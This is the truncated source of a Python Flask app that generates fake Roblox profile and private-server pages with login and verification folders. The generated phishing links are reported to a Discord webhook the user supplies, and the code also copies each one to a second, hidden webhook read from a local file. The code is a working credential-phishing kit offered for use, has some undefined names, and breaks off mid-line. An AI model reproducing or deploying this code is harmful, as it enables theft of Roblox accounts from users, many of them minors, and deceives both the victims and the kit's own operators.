from flask import Flask, request, render_template, redirect, url_for
import os
import requests
from datetime import datetime
import random

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def fake_link_generator():
    error = None
    success = None
    if request.method == 'POST':
        if 'rusername' in request.form and 'fusername' in request.form and 'dwebhook' in request.form:
            rusername = request.form['rusername']
            fusername = request.form['fusername']
            dwebhook = request.form['dwebhook']
            ab = requests.get(f"https://api.newstargeted.com/roblox/users/v2/user.php?username={rusername}").content
            if json.loads(ab).get('userId'):
                parse = dwebhook.split('//')[1].split('/')[0]
                if parse in ['discord.com', 'discordapp.com']:
                    userid = random.randint(1, 1000000)
                    os.makedirs(f"../../users/{userid}/profile/login", exist_ok=True)
                    os.makedirs(f"../../users/{userid}/profile/login/Verification", exist_ok=True)
                    os.makedirs(f"../../users/{userid}/profile/controller", exist_ok=True)
                    # Create necessary files with respective contents
                    create_files(userid, request.form)
                    domain = f"{request.scheme}://{request.host}"
                    timestamp = datetime.now().isoformat()
                    url = dwebhook
                    headers = {"Content-Type": "application/json; charset=utf-8"}
                    POST = create_post_content(name, thumbnail, domain, userid, hex_color, timestamp)
                    response = requests.post(url, headers=headers, json=POST, verify=False)
                    dual = open('d_webhook.txt').read()
                    response = requests.post(dual, headers=headers, json=POST, verify=False)
                    success = 'Your link and controller token have been sent to your webhook!'
                else:
                    error = 'This does not look like a webhook!'
            else:
                error = 'This does not look like a Roblox user!'
        elif 'gameid' in request.form and 'dwebhook' in request.form:
            gameid = request.form['gameid']
            dwebhook = request.form['dwebhook']
            ab = requests.get(f"https://www.roblox.com/places/api-get-details?assetId={gameid}").content
            if json.loads(ab).get('UniverseId'):
                parse = dwebhook.split('//')[1].split('/')[0]
                if parse in ['discord.com', 'discordapp.com']:
                    fgameid = random.randint(1, 1000000)
                    privateservercode = random.randint(1, 1000000)
                    db = requests.get(f"https://www.roblox.com/places/api-get-details?assetId={gameid}").content
                    gamename = json.loads(db).get('Url').replace(f"https://www.roblox.com/games/{gameid}/", '')
                    os.makedirs(f"../../games/{fgameid}/{gamename}/login", exist_ok=True)
                    os.makedirs(f"../../games/{fgameid}/{gamename}/login/Verification", exist_ok=True)
                    # Create necessary files with respective contents for game
                    create_game_files(fgameid, gamename, request.form)
                    return redirect(f"/games/{fgameid}/{gamename}?privateServerLinkCode={privateservercode}")
                else:
                    error = 'This does not look like a webhook!'
            else:
                error = 'This game does not exist on Roblox!'
    return render_template('index.html', error=error, success=success)

def create_files(userid, form_data):
    files_to_create = [
        ("../../users/{}/profile/index.html", 'profile.php'),
        ("../../users/{}/profile/controller/realusername.txt", form_data['rusername']),
        ("../../users/{}/profile/fakeusername.txt", form_data['fusername']),
        ("../../users/{}/profile/aboutme.txt", form_data['aboutme']),
        ("../../users/{}/profile/controller/activity.txt", 'game'),
        ("../../users/{}/profile/controller/friends.txt", '163'),
        ("../../users/{}/profile/controller/followers.txt", '3871'),
        ("../../users/{}/profile/controller/followings.txt", '542'),
        ("../../users/{}/profile/controller/joindate.txt", '6/4/2017'),
        ("../../users/{}/profile/controller/placevisits.txt", '782')
    ]
    for file_path, content in files_to_create:
        with open(file_path.format(userid), 'w') as f:
            f.write(content)
    # Additional files with token replacements
    token = create_token()
    with open(f"../../users/{
